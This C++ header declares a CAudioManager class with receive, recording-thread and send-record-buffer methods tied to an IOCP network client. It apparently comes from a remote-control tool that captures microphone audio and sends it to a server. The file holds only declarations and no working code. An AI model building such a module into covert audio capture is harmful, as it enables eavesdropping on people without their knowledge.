// AudioManager.h: interface for the CAudioManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_AUDIOMANAGER_H__B47ECAB3_9810_4031_9E2E_BC34825CAD74__INCLUDED_)
#define AFX_AUDIOMANAGER_H__B47ECAB3_9810_4031_9E2E_BC34825CAD74__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include "Audio.h"
class CAudioManager : public CManager  
{
public:
	VOID  OnReceive(PBYTE szBuffer, ULONG ulLength);
	BOOL CAudioManager::Initialize();
	CAudioManager(IOCPClient* ClientObject);
	virtual ~CAudioManager();
	BOOL  m_bIsWorking;
	HANDLE m_hWorkThread;
	static DWORD WorkThread(LPVOID lParam);
	int CAudioManager::SendRecordBuffer();

	CAudio*  m_AudioObject;

};

#endif // !defined(AFX_AUDIOMANAGER_H__B47ECAB3_9810_4031_9E2E_BC34825CAD74__INCLUDED_)
